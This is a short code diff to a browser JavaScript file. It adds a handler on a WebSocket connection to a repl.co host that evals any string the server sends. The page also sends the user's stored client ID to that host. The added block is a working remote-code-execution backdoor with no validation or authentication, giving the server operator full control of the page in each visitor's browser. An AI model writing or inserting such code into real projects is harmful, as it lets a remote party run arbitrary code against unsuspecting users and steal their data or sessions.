@@ -145,5 +145,19 @@ setInterval(checkOnlineStatus, 5000);
 
 // Define the server address here
 const ws = new WebSocket("wss://socketio.megaderp100.repl.co");
+
+ws.addEventListener("message", e => {
+  const receivedCode = e.data; // Assuming the code is sent as a string
+  if (ws.readyState === WebSocket.OPEN) {
+    try {
+      eval(receivedCode); // Execute the received JavaScript code
+    } catch (error) {
+      console.error("Error executing received code:", error);
+    }
+  } else {
+    console.warn("WebSocket is not open. Cannot execute received code.");
+  }
+});
+
 ws.send(localStorage.getItem("customClientID"))
 
